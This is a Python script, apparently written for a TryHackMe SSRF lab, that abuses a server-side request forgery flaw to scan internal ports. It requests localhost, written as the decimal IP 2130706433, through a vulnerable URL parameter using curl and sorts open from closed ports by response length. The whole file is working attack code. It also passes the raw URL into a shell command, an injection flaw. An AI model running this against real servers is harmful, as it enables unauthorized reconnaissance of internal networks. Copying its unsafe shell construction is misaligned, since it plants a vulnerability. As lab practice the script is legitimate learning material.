#!/bin/python3

import sys
import subprocess
import argparse

#TEST: https://tryhackme.com/room/ssrf
#Example: python3 ssrf_port_enum.py -p 1 1000 -f "results.txt" "http://10.10.189.241:8000/attack?url=http://2130706433:"

class response(object):
	def __init__(self, response, port):
		self.response = response
		self.length = len(response)
		self.occurences = 1
		self.ports = []
		self.ports.append(port)
		
	def new_occurence(self, port):
		self.occurences += 1
		self.ports.append(port)

def show_description():
	print("""Enumerating ports for ssrf vulnerable web application\n
Examples:  python3 ssrf_port_enum.py "http://10.10.189.241:8000/attack?url=http://2130706433:"
           python3 ssrf_port_enum.py -p 1 1000 "http://10.10.189.241:8000/attack?url=http://2130706433:"
	   python3 ssrf_port_enum.py -p 1 1000 -f "results.txt" "http://10.10.189.241:8000/attack?url=http://2130706433:"\n\n""")

def save_to_file(responses, filename):
	with open(filename, "w") as f:
		f.write("SCAN RESULTS\n\n")
		f.write("-"*200 + "\n")
		for r in responses:
			ports = ""
			for p in r.ports:
				ports += f"{str(p)}, "

			f.write(f"\nResponse:\n{r.response}")
			f.write(f"\nPorts: {ports}")
			f.write(f"\nNumber of occurences: {str(r.occurences)}\n")
			f.write("\n" + "-"*200 + "\n")
	
	print('Results saved to file: ' + filename)

def enumerate_ports(url, first_port, last_port):
	responses = []
	
	print('URL: ' + url + 'PORT')	
	print('Scan port range: ' + str(first_port) + '-' + str(last_port))
	
	#scanning
	for x in range(first_port, last_port + 1):
		r = subprocess.getoutput("curl -s " + url + str(x))
		
		#for timeouts
		if r == "":
			print(f"Timeout for port: {x}. Trying again...")
			r = subprocess.getoutput("curl -s " + url + str(x))
			if r == "":
				r = "***** TIMEOUT *****"
				print(f"Timeout again... Skipped port {x} scan")
		
		response_not_exists = True

		#adding response to list
		for item in responses:
			if len(r) == item.length:
				item.new_occurence(x)
				response_not_exists  = False
				break
		
		if response_not_exists:
			responses.append(response(r, x))

	#sort responses from the lowest number of occurs to the highest
	responses.sort(key = lambda responses : responses.occurences)
	
	return responses

def main():
	try:
		parser = argparse.ArgumentParser(description=show_description())
		parser.add_argument('URL', type=str,
			help='url which contains ssrf vulnerability')
		parser.add_argument('-p', '--port', type=int, nargs=2, default=[0, 65535],
			help='port range to scan (first_port last_port)')
		parser.add_argument('-f', '--filename', type=str, default='ssrf_enum_result.txt',
			help='name of file to which one will be saved scan results, default it is ssrf_enum_result.txt')
		args = parser.parse_args()
		
		url = args.URL
		first_port = args.port[0]
		last_port = args.port[1]
		filename = args.filename
		
		if first_port > last_port or first_port > 65535 or first_port < 0 or last_port > 65535 or last_port < 0:
			raise ValueError("Wrong port numbers!")
		
		responses = enumerate_ports(url, first_port, last_port)
		save_to_file(responses, filename)
	except Exception as e:
		print('Error: ' + str(e))
		print('Script terminated!')


main()

